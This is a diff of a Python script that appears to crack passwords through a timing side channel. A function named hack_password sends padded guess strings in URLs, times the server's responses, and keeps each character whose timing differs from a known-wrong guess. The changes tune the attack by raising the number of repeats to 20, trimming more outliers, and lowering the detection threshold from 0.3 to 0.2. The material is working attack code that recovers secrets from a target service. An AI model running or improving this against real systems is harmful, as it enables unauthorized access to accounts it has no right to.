@@ -31,6 +31,9 @@ def timeit(url2check,  repeat=1):
         times.append(end - start)
 
     removed = remove_4(times)
+    if repeat > 15:
+        removed = remove_4(removed)
+        
     return mean(removed)
 
 
@@ -142,7 +145,7 @@ def hack_password(url, pool, max_length, padding_length):
         test_wrong_pass = [current_letter] * padding_length
         test_wrong_pass[i + max_length] = '*'
         test_wrong_url = url + ''.join(test_wrong_pass)
-        wrong_time = timeit(test_wrong_url, REPEAT_CHECK)
+        wrong_time = timeit(test_wrong_url, 20)
 
         cur_letter_time = 0.0
 
@@ -159,7 +162,7 @@ def hack_password(url, pool, max_length, padding_length):
                 cur_letter_time = t
                 continue
                 
-            if wrong_time - t > 0.3:
+            if wrong_time - t > 0.2:
                 print('=============================')
                 print(f'CHAR FOUND: {ch} | AT POS {i}')
                 password.append(ch)
